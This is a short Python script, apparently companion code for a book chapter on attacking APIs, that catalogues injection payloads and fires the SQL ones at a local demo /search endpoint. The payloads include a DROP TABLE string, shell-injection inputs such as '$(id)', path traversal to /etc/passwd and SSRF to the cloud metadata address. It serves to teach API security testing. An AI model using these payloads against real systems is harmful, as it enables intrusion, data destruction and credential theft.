"""
Chapter 7 - Attacking APIs: injection payloads.
A catalogue of injection test strings and a runner against the demo /search sink.
Covers SQLi, NoSQLi, command injection, path traversal and SSRF (as discussed in Ch7).
"""
import requests

BASE = "http://localhost:8000"

PAYLOADS = {
    "SQL injection": ["' OR '1'='1", "'; DROP TABLE users;--", "admin'--"],
    "NoSQL injection": ['{"$ne": null}', '{"$gt": ""}'],
    "Command injection": ["; ls -la", "| whoami", "$(id)"],
    "Path traversal": ["../../etc/passwd", "..%2f..%2fetc%2fpasswd"],
    "SSRF": ["http://169.254.169.254/latest/meta-data/",
             "http://localhost:8000/debug"],
}


def probe_search():
    for value in PAYLOADS["SQL injection"]:
        r = requests.get(f"{BASE}/search", params={"q": value}, timeout=5)
        print(f"q={value!r} -> executed_query: {r.json().get('executed_query')}")


if __name__ == "__main__":
    print("Injection payload catalogue:")
    for cat, items in PAYLOADS.items():
        print(f"  {cat}: {items}")
    print("\nProbing demo /search sink:")
    probe_search()
